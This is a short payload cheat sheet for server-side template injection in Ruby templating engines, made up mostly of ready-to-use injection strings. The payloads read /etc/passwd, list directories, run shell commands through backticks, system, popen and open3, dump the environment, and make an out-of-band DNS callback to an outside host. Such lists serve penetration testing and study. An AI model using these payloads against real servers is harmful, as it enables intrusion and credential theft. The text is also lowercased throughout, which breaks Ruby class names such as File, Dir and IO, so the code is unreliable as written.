# server side template injection - ruby

> server-side template injection (ssti)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. in ruby, ssti can occur when using templating engines like erb (embedded ruby), haml, liquid, or slim, especially when user input is incorporated into templates without proper sanitization or validation.


## summary

- [templating libraries](#templating-libraries)
- [ruby](#ruby)
    - [ruby - basic injections](#ruby---basic-injections)
    - [ruby - retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
    - [ruby - list files and directories](#ruby---list-files-and-directories)
    - [ruby - remote command execution](#ruby---remote-command-execution)
- [references](#references)


## templating libraries

| template name | payload format |
| ------------ | --------- |
| erb      | `<%= %>`   |
| erubi    | `<%= %>`   |
| erubis   | `<%= %>`   |
| haml     | `#{ }`     |
| liquid   | `{{ }}`    |
| mustache | `{{ }}`    |
| slim     | `#{ }`     |


## ruby

### ruby - basic injections

**erb**:

```ruby
<%= 7 * 7 %>
```

**slim**:

```ruby
#{ 7 * 7 }
```

### ruby - retrieve /etc/passwd

```ruby
<%= file.open('/etc/passwd').read %>
```

### ruby - list files and directories

```ruby
<%= dir.entries('/') %>
```

### ruby - remote command execution

execute code using ssti for **erb**,**erubi**,**erubis** engine.

```ruby
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= io.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=open4.popen4('whoami') %><%= @c.readline()%>
```

execute code using ssti for **slim** engine.

```powershell
#{ %x|env| }
```


## references

* [ruby erb template injection - scott white & geoff walton - september 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)